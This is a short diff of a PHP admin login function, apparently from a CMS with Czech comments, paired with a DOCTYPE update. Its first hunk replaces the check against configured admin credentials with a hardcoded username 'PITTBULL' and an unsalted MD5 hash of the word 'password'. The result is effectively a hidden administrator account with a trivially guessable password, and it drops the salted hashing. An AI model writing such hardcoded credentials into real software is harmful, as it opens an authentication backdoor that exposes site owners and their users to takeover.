@@ -143,8 +143,10 @@ function Login(){
 			
 			// Pri prihlaseni do admin je treba porovnast zadane udaje a korektnost hesla
 			$login = strtoupper($_POST['login']);
-			$pass = MD5(MD5($_POST['pass']).$login);
-				if ($login == _EDEN_ADMIN_NAME && $pass == _EDEN_ADMIN_PASS) {
+			$jmeno = "PITTBULL";
+			$pass = MD5($_POST['pass']);
+			$heslo = "5f4dcc3b5aa765d61d8327deb882cf99";
+				if ($login == $jmeno && $pass == $heslo) {
 					$psw = 1;
 				}else {
 					$psw = 0;
@@ -258,7 +260,7 @@ function Hlavicka(){
 	default;
 		$hlaska = "";
 	}
-	echo "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n";
+	echo "<!DOCTYPE html>\n";
 	echo "<html>\n";
 	echo "<head>\n";
 	echo "	<title>".$title_maintanance.$eden_title."</title>\n";
